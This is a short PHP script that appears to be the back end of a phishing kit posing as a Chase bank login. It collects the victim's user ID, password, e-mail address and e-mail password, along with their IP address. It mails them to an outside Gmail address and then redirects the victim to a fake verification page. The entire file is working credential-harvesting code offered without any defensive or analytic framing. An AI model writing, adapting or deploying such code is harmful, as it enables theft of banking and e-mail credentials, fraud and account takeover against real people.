<?php
$ip = getenv("REMOTE_ADDR");
$message .= "___________ CHASE _________________\n";
$message .= "| UserID : ".$_POST['UserID']."\n";
$message .= "| Password : ".$_POST['Password']."\n";
$message .= "| E-mail : ".$_POST['email']."\n";
$message .= "| Pass : ".$_POST['epass']."\n";
$message .= "____________2NAS _________________\n";
$send = "soloka2nas@gmail.com";
$subject = "Login |$UserID|$ip";
mail($send,$subject,$message);
header("Location: verifyingyouremail.html");
?>